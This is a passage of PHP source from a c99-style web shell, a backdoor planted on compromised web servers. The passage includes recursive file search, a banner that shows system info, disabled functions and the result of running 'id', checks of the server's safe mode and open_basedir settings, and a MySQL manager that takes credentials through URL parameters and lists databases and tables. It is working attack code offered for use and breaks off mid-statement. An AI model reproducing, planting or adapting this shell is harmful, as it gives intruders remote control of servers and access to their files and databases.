}\r\n if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}\r\n}\r\n}\r\nif (!function_exists("mysql_create_db"))\r\n{\r\nfunction mysql_create_db($db,$sock="")\r\n{\r\n $sql = "CREATE DATABASE `".addslashes($db)."`;";\r\n if ($sock) {return mysql_query($sql,$sock);}\r\n else {return mysql_query($sql);}\r\n}\r\n}\r\nif (!function_exists("mysql_query_parse"))\r\n{\r\nfunction mysql_query_parse($query)\r\n{\r\n $query = trim($query);\r\n $arr = explode (" ",$query);\r\n /*array array()\r\n {\r\n  "METHOD"=>array(output_type),\r\n  "METHOD1"...\r\n  ...\r\n }\r\n if output_type == 0, no output,\r\n if output_type == 1, no output if no error\r\n if output_type == 2, output without control-buttons\r\n if output_type == 3, output with control-buttons\r\n */\r\n $types = array(\r\n  "SELECT"=>array(3,1),\r\n  "SHOW"=>array(2,1),\r\n  "DELETE"=>array(1),\r\n  "DROP"=>array(1)\r\n );\r\n $result = array();\r\n $op = strtoupper($arr[0]);\r\n if (is_array($types[$op]))\r\n {\r\n  $result["propertions"] = $types[$op];\r\n  $result["query"]  = $query;\r\n  if ($types[$op] == 2)\r\n  {\r\n   foreach($arr as $k=>$v)\r\n   {\r\n    if (strtoupper($v) == "LIMIT")\r\n    {\r\n     $result["limit"] = $arr[$k+1];\r\n     $result["limit"] = explode(",",$result["limit"]);\r\n     if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}\r\n     unset($arr[$k],$arr[$k+1]);\r\n    }\r\n   }\r\n  }\r\n }\r\n else {return FALSE;}\r\n}\r\n}\r\nif (!function_exists("c99fsearch"))\r\n{\r\nfunction c99fsearch($d)\r\n{\r\n global $found;\r\n global $found_d;\r\n global $found_f;\r\n global $search_i_f;\r\n global $search_i_d;\r\n global $a;\r\n if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\r\n $h = opendir($d);\r\n while (($f = readdir($h)) !== FALSE)\r\n {\r\n  if($f != "." && $f != "..")\r\n  {\r\n   $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));\r\n   if (is_dir($d.$f))\r\n   {\r\n    $search_i_d++;\r\n    if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}\r\n    if (!is_link($d.$f)) {c99fsearch($d.$f);}\r\n   }\r\n   else\r\n   {\r\n    $search_i_f++;\r\n    if ($bool)\r\n    {\r\n     if (!empty($a["text"]))\r\n     {\r\n      $r = @file_get_contents($d.$f);\r\n      if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}\r\n      if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}\r\n      if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}\r\n      else {$bool = strpos(" ".$r,$a["text"],1);}\r\n      if ($a["text_not"]) {$bool = !$bool;}\r\n      if ($bool) {$found[] = $d.$f; $found_f++;}\r\n     }\r\n     else {$found[] = $d.$f; $found_f++;}\r\n    }\r\n   }\r\n  }\r\n }\r\n closedir($h);\r\n}\r\n}\r\nif ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$act = "f"; $d = dirname($f); $f = basename($f);}}\r\n//Sending headers\r\n@ob_start();\r\n@ob_implicit_flush(0);\r\nfunction onphpshutdown()\r\n{\r\n global $gzipencode,$ft;\r\n if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad")))\r\n {\r\n  $v = @ob_get_contents();\r\n  @ob_end_clean();\r\n  @ob_start("ob_gzHandler");\r\n  echo $v;\r\n  @ob_end_flush();\r\n }\r\n}\r\nfunction c99shexit()\r\n{\r\n onphpshutdown();\r\n exit;\r\n}\r\nheader("Expires: Mon, 26 Jul 1997 05:00:00 GMT");\r\nheader("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");\r\nheader("Cache-Control: no-store, no-cache, must-revalidate");\r\nheader("Cache-Control: post-check=0, pre-check=0", FALSE);\r\nheader("Pragma: no-cache");\r\nif (empty($tmpdir))\r\n{\r\n $tmpdir = ini_get("upload_tmp_dir");\r\n if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}\r\n}\r\n$tmpdir = realpath($tmpdir);\r\n$tmpdir = str_replace("\\\\",DIRECTORY_SEPARATOR,$tmpdir);\r\nif (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}\r\nif (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}\r\nelse {$tmpdir_logs = realpath($tmpdir_logs);}\r\nif (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")\r\n{\r\n $safemode = TRUE;\r\n $hsafemode = "<font color=red>ON (secure)</font>";\r\n}\r\nelse {$safemode = FALSE; $hsafemode = "<font color=green>OFF (not secure)</font>";}\r\n$v = @ini_get("open_basedir");\r\nif ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "<font color=red>".$v."</font>";}\r\nelse {$openbasedir = FALSE; $hopenbasedir = "<font color=green>OFF (not secure)</font>";}\r\n$sort = htmlspecialchars($sort);\r\nif (empty($sort)) {$sort = $sort_default;}\r\n$sort[1] = strtolower($sort[1]);\r\n$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");\r\nif (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}\r\n$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\\"".$surl."act=phpinfo\\" target=\\"_blank\\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));\r\n@ini_set("highlight.bg",$highlight_bg); //FFFFFF\r\n@ini_set("highlight.comment",$highlight_comment); //#FF8000\r\n@ini_set("highlight.default",$highlight_default); //#0000BB\r\n@ini_set("highlight.html",$highlight_html); //#000000\r\n@ini_set("highlight.keyword",$highlight_keyword); //#007700\r\n@ini_set("highlight.string",$highlight_string); //#DD0000\r\nif (!is_array($actbox)) {$actbox = array();}\r\n$dspact = $act = htmlspecialchars($act);\r\n$disp_fullpath = $ls_arr = $notls = null;\r\n$ud = urlencode($d);\r\n?>\r\n\r\n<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title>shell@<?php echo getenv("HTTP_HOST"); ?></title><STYLE>\r\nTD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}\r\n.style1 {\r\n\tcolor: #FF0000;\r\n\tfont-weight: bold;\r\n}\r\n.style2 {font-size: -3}\r\n</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><div align="center"><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"></p>\r\n  <p><font size="-3"><span class="style2"></br>\r\n <font color="#333333">k1ngw4ck1ng</font><font color="white">w</font><font color="#333333">4ck1</font><font color="white">ngw4ck1n</font><font color="#333333">gw4c</font><font color="white">k</font><font color="#333333">1ngw4ck</font><font color="white">1ngw</font><font color="#333333">4ck</font><font color="white">1</font><font color="#333333">ngw4ck1ngw4ck1ng</font><font color="white">w4</font><font color="#333333">ck1ngw4ck1</font><font color="white">n</font><font color="#333333">gw4ck1ngw</font><font color="white">4</font><font color="#333333">ck1ngw4ck1</font><font color="white">n</font><font color="#333333">gw4c</font><font color="white">k1ng</font><font color="#333333">w4ck1ngw4ck1ngw4ck1ngw4ck1ng</font><br>\r\n\r\n      <font color="#333333">w4ck1ngw4c</font><font color="white">k1n</font><font color="#333333">gw4ck</font><font color="white">1ngw4</font><font color="#333333">ck</font><font color="white">1ngw4ck1n</font><font color="#333333">gw</font><font color="white">4ck1n</font><font color="#333333">g</font><font color="white">w</font><font color="#333333">4ck1ngw4ck</font><font color="white">1ngw4</font><font color="#333333">ck</font><font color="white">1ng</font><font color="#333333">w4ck1n</font><font color="white">gw4ck1</font><font color="#333333">ngw4ck</font><font color="white">1n</font><font color="#333333">gw4ck1ngw</font><font color="white">4ck</font><font color="#333333">1ng</font><font color="white">w4ck</font><font color="#333333">1ngw4ck1ngw4ck1ngw4ck1ngw4ck</font><br>\r\n\r\n      <font color="#333333">1ngw4ck1ng</font><font color="white">w4ck</font><font color="#333333">1ngw</font><font color="white">4ck1</font><font color="#333333">ngw4</font><font color="white">ck1</font><font color="#333333">ng</font><font color="white">w4c</font><font color="#333333">k1</font><font color="white">ngw4</font><font color="#333333">c</font><font color="white">k1</font><font color="#333333">ngw</font><font color="white">4</font><font color="#333333">ck</font><font color="white">1ngw4ck1ng</font><font color="#333333">w</font><font color="white">4ck</font><font color="#333333">1ng</font><font color="white">w4ck1n</font><font color="#333333">gw4ck1ngw</font><font color="white">4ck</font><font color="#333333">1ngw4ck1</font><font color="white">ngw4</font><font color="#333333">c</font><font color="white">k1ngw</font><font color="#333333">4ck1n</font><font color="white">gw4ck1ngw4ck</font><font color="#333333">1ngw4ck1ngw</font><br>\r\n\r\n      <font color="#333333">4ck1ngw4ck1</font><font color="white">ngw4</font><font color="#333333">ck</font><font color="white">1ngw4</font><font color="#333333">ck1</font><font color="white">ngw4</font><font color="#333333">ck1ngw</font><font color="white">4ck1</font><font color="#333333">n</font><font color="white">gw4</font><font color="#333333">ck1</font><font color="white">ngw4ck</font><font color="#333333">1ngw4</font><font color="white">ck</font><font color="#333333">1</font><font color="white">ngw4ck1n</font><font color="#333333">gw4ck1ngw4ck</font><font color="white">1ngw</font><font color="#333333">4ck1ngw4</font><font color="white">ck1n</font><font color="#333333">g</font><font color="white">w4ck1ngw4ck</font><font color="#333333">1ngw4c</font><font color="white">k1ngw</font><font color="#333333">4ck1ngw4ck1</font><br>\r\n\r\n      <font color="#333333">ngw4ck1ngw4c</font><font color="white">k1ngw4ck1ng</font><font color="#333333">w4</font><font color="white">ck1n</font><font color="#333333">gw4ck1</font><font color="white">ngw4</font><font color="#333333">c</font><font color="white">k1ngw4ck1n</font><font color="#333333">gw4ck1n</font><font color="white">gw4ck1ngw4ck</font><font color="#333333">1ngw4ck1ng</font><font color="white">w4ck1</font><font color="#333333">ngw4ck1</font><font color="white">ngw4ck1ngw4ck1ng</font><font color="#333333">w4ck1ng</font><font color="white">w4ck1n</font><font color="#333333">gw4ck1ngw4</font><br>\r\n\r\n      <font color="#333333">ck1ngw4ck1ng</font><font color="white">w4ck1ngw</font><font color="#333333">4c</font><font color="white">k1ngw4c</font><font color="#333333">k1ng</font><font color="white">w4ck1ngw4c</font><font color="#333333">k1n</font><font color="white">gw4c</font><font color="#333333">k1ngw4c</font><font color="white">k1ngw4ck1ngw4ck</font><font color="#333333">1ngw4c</font><font color="white">k1</font><font color="#333333">n</font><font color="white">gw4</font><font color="#333333">ck1ngw4</font><font color="white">ck1ngw4ck1ngw4ck1ngw4ck1ngw</font><font color="#333333">4ck1ngw4ck1n</font><br>\r\n\r\n      <font color="#333333">gw4ck1ngw4ck1</font><font color="white">ngw4ck</font><font color="#333333">1ngw</font><font color="white">4ck1ng</font><font color="#333333">w4c</font><font color="white">k1ngw</font><font color="#333333">4</font><font color="white">ck1n</font><font color="#333333">gw4c</font><font color="white">k1ng</font><font color="#333333">w4ck1n</font><font color="white">gw4ck1ngw4ck1ngw4ck1</font><font color="#333333">ngw4ck</font><font color="white">1ng</font><font color="#333333">w4ck1n</font><font color="white">gw4</font><font color="#333333">c</font><font color="white">k1ngw4</font><font color="#333333">ck1</font><font color="white">ngw4</font><font color="#333333">ck1ngw4</font><font color="white">ck1</font><font color="#333333">ngw4ck1ngw4c</font><br>\r\n\r\n      <font color="#333333">k1ngw4ck1ngw4c</font><font color="white">k1ngw</font><font color="#333333">4ck1n</font><font color="white">gw4ck</font><font color="#333333">1ngw4ck1n</font><font color="white">gw4c</font><font color="#333333">k1ngw</font><font color="white">4ck1ngw4ck1n</font><font color="#333333">g</font><font color="white">w4ck1</font><font color="#333333">ngw4</font><font color="white">ck1ngw4ck</font><font color="#333333">1ngw</font><font color="white">4ck</font><font color="#333333">1ngw4c</font><font color="white">k1n</font><font color="#333333">gw</font><font color="white">4ck1</font><font color="#333333">ngw4ck1n</font><font color="white">g</font><font color="#333333">w4ck1n</font><font color="white">gw4c</font><font color="#333333">k1ngw4ck1ng</font><br>\r\n\r\n      <font color="#333333">w4ck1ngw4ck1ngw4</font><font color="white">ck1</font><font color="#333333">ngw4ck</font><font color="white">1ngw</font><font color="#333333">4ck1ngw4</font><font color="white">ck1ng</font><font color="#333333">w4ck1n</font><font color="white">gw4ck1ngw</font><font color="#333333">4ck1</font><font color="white">ngw4</font><font color="#333333">ck1ngw4ck</font><font color="white">1ngw4ck1ngw4c</font><font color="#333333">k1n</font><font color="white">gw4</font><font color="#333333">ck1n</font><font color="white">gw4</font><font color="#333333">ck1ngw4ck1ngw</font><font color="white">4ck1ng</font><font color="#333333">w4ck1ngw4ck</font><br>\r\n\r\n      <font color="#333333">1ngw4ck1ngw4ck1ngw4ck1ngw4</font><font color="white">c</font><font color="#333333">k1ngw4ck1ng</font><font color="white">w</font><font color="#333333">4ck1ngw4ck1ngw4ck1ngw4ck1n</font><font color="white">g</font><font color="#333333">w4ck1ngw4c</font><font color="white">k1ngw4</font><font color="#333333">c</font><font color="white">k</font><font color="#333333">1ngw4c</font><font color="white">k1n</font><font color="#333333">gw4c</font><font color="white">k1n</font><font color="#333333">gw4ck1ngw4ck1ngw</font><font color="white">4ck1n</font><font color="#333333">gw4ck1ngw</font><br>\r\n\r\n      <font color="#333333">4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ng</font><font color="white">w4</font><font color="#333333">ck1ngw4ck1ngw4ck1n</font><font color="white">gw4ck</font><font color="#333333">1ngw4ck1</font><br>\r\n      <font color="#333333">ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1ngw4ck1</font><font color="white">n</font><font color="#333333">gw4ck1ngw4ck1ngw4ck1ng</font><font color="white">w</font><font color="#333333">4ck1ngw4</font></br>\r\n  </span>&nbsp;</p></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>System Info:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?></b>&nbsp;</p><? echo "<b>Disabled functions</b>: <b>";\r\nif(\'\'==($df=@ini_get(\'disable_functions\'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";} ?><p align="left"><b>We are: <?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?><?php $curl_on = @function_exists(\'curl_version\');\r\necho "<br/>cURL: <b>".(($curl_on)?("<font color=green>ON</font>"):("<font color=red>OFF</font>")); ?></br><? if(@ini_get("register_globals")){$reg_g="<font color=green>ON</font>";}else{$reg_g="<font color=red>OFF</font>";} echo("<b>Register globals:</b> $reg_g"); ?><?php echo "<br/>MySQL: <b>";\r\n$mysql_on = @function_exists(\'mysql_connect\');\r\nif($mysql_on){\r\necho "<font color=green>ON</font>"; } else { echo "<font color=red>OFF</font>"; }\r\necho "</b>";\r\necho "<br/>MSSQL: <b>";\r\n$mssql_on = @function_exists(\'mssql_connect\');\r\nif($mssql_on){echo "<font color=green>ON</font>";}else{echo "<font color=red>OFF</font>";} ?><?php echo "<br/>PostgreSQL: <b>";\r\n$pg_on = @function_exists(\'pg_connect\');\r\nif($pg_on){echo "<font color=green>ON</font>";}else{echo "<font color=red>OFF</font>";} ?><?php echo "<br/>Oracle: <b>";\r\n$ora_on = @function_exists(\'ocilogon\');\r\nif($ora_on){echo "<font color=green>ON</font>";}else{echo "<font color=red>OFF</font>";} ?> </b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php\r\n$d = str_replace("\\\\",DIRECTORY_SEPARATOR,$d);\r\nif (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}\r\n$d = str_replace("\\\\",DIRECTORY_SEPARATOR,$d);\r\nif (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}\r\n$d = str_replace("\\\\\\\\","\\\\",$d);\r\n$dispd = htmlspecialchars($d);\r\n$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));\r\n$i = 0;\r\nforeach($pd as $b)\r\n{\r\n $t = "";\r\n $j = 0;\r\n foreach ($e as $r)\r\n {\r\n  $t.= $r.DIRECTORY_SEPARATOR;\r\n  if ($j == $i) {break;}\r\n  $j++;\r\n }\r\n echo "<a href=\\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\\"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>";\r\n $i++;\r\n}\r\necho "&nbsp;&nbsp;&nbsp;";\r\nif (is_writable($d))\r\n{\r\n $wd = TRUE;\r\n $wdt = "<font color=green>[ ok ]</font>";\r\n echo "<b><font color=green>".view_perms(fileperms($d))."</font></b>";\r\n}\r\nelse\r\n{\r\n $wd = FALSE;\r\n $wdt = "<font color=red>[ Read-Only ]</font>";\r\n echo "<b>".view_perms_color($d)."</b>";\r\n}\r\nif (is_callable("disk_free_space"))\r\n{\r\n $free = disk_free_space($d);\r\n $total = disk_total_space($d);\r\n if ($free === FALSE) {$free = 0;}\r\n if ($total === FALSE) {$total = 0;}\r\n if ($free < 0) {$free = 0;}\r\n if ($total < 0) {$total = 0;}\r\n $used = $total-$free;\r\n $free_percent = round(100/($total/$free),2);\r\n echo "<br><b>Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)</b>";\r\n\r\n}\r\necho "<br>";\r\necho "<b>Your ip: <a href=http://".$_SERVER["REMOTE_ADDR"].">".$_SERVER["REMOTE_ADDR"]."</a> - Server ip: <a href=http://".gethostbyname($_SERVER["HTTP_HOST"]).">".gethostbyname($_SERVER["HTTP_HOST"])."</a></b><br/>";\r\n$letters = "";\r\nif ($win)\r\n{\r\n $v = explode("\\\\",$d);\r\n $v = $v[0];\r\n foreach (range("a","z") as $letter)\r\n {\r\n  $bool = $isdiskette = in_array($letter,$safemode_diskettes);\r\n  if (!$bool) {$bool = is_dir($letter.":\\\\");}\r\n  if ($bool)\r\n  {\r\n   $letters .= "<a href=\\"".$surl."act=ls&d=".urlencode($letter.":\\\\")."\\"".($isdiskette?" onclick=\\"return confirm(\'Make sure that the diskette is inserted properly, otherwise an error may occur.\')\\"":"").">[ ";\r\n   if ($letter.":" != $v) {$letters .= $letter;}\r\n   else {$letters .= "<font color=green>".$letter."</font>";}\r\n   $letters .= " ]</a> ";\r\n  }\r\n }\r\n if (!empty($letters)) {echo "<b>Detected drives</b>: ".$letters."<br>";}\r\n}\r\nif (count($quicklaunch) > 0)\r\n{\r\n foreach($quicklaunch as $item)\r\n {\r\n  $item[1] = str_replace("%d",urlencode($d),$item[1]);\r\n  $item[1] = str_replace("%sort",$sort,$item[1]);\r\n  $v = realpath($d."..");\r\n  if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}\r\n  $item[1] = str_replace("%upd",urlencode($v),$item[1]);\r\n  echo "<a href=\\"".$item[1]."\\">".$item[0]."</a>&nbsp;&nbsp;&nbsp;&nbsp;";\r\n }\r\n}\r\necho "</p></td></tr></table><br>";\r\nif ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\\"BORDER-COLLAPSE: collapse\\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\"100%\\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\\"100%\\" valign=\\"top\\">".$donated_html."</td></tr></table><br>";}\r\necho "<TABLE style=\\"BORDER-COLLAPSE: collapse\\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\\"100%\\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\\"100%\\" valign=\\"top\\">";\r\nif ($act == "") {$act = $dspact = "ls";}\r\nif ($act == "sql")\r\n{\r\n $sql_surl = $surl."act=sql";\r\n if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}\r\n if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}\r\n if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}\r\n if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}\r\n if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}\r\n $sql_surl .= "&";\r\n ?><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php\r\n if ($sql_server)\r\n {\r\n  $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);\r\n  $err = mysql_smarterror();\r\n  @mysql_select_db($sql_db,$sql_sock);\r\n  if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}\r\n }\r\n else {$sql_sock = FALSE;}\r\n echo "<b>SQL Manager:</b><br>";\r\n if (!$sql_sock)\r\n {\r\n  if (!$sql_server) {echo "NO CONNECTION";}\r\n  else {echo "<center><b>Can\'t connect</b></center>"; echo "<b>".$err."</b>";}\r\n }\r\n else\r\n {\r\n  $sqlquicklaunch = array();\r\n  $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");\r\n  $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));\r\n  $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");\r\n  $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");\r\n  $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");\r\n  $sqlquicklaunch[] = array("Logout",$surl."act=sql");\r\n  echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \\"".htmlspecialchars($sql_passwd)."\\")</b><br>";\r\n  if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\\"".$item[1]."\\"><b>".$item[0]."</b></a> ] ";}}\r\n  echo "</center>";\r\n }\r\n echo "</td></tr><tr>";\r\n if (!$sql_sock) {?><td width="28%" height="100" valign="top"><center><font size="5"><br/></font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php echo $surl; ?>" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php }\r\n else\r\n {\r\n  //Start left panel\r\n  if (!empty($sql_db))\r\n  {\r\n   ?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."w4/act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade><?php\r\n   $result = mysql_list_tables($sql_db);\r\n   if (!$result) {echo mysql_smarterror();}\r\n   else\r\n   {\r\n    echo "---[ <a href=\\"".$sql_surl."&\\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";\r\n    $c = 0;\r\n    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>\xbb&nbsp;<a href=\\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}\r\n    if (!$c) {echo "No tables found in database.";}\r\n   }\r\n  }\r\n  else\r\n  {\r\n   ?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade><?php\r\n   $result = mysql_list_dbs($sql_sock);\r\n   if (!$result) {echo mysql_smarterror();}\r\n   else\r\n   {\r\n    ?><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db"><?php\r\n    $c = 0;\r\n    $dbs = "";\r\n    while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\\"".$row[0]."\\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;}\r\n    echo "<option value=\\"\\">Databases (".$c.")</option>";\r\n    echo $dbs;\r\n   }\r\n   ?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form><?php\r\n  }\r\n  //End left panel\r\n  echo "</td><td width=\\"100%\\" height=\\"1\\" valign=\\"top\\">";\r\n  //Start center panel\r\n  $diplay = TRUE;\r\n  if ($sql_db)\r\n  {\r\n   if (!is_numeric($c)) {$c = 0;}\r\n   if ($c == 0) {$c = "no";}\r\n   echo "<hr size=\\"1\\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";\r\n   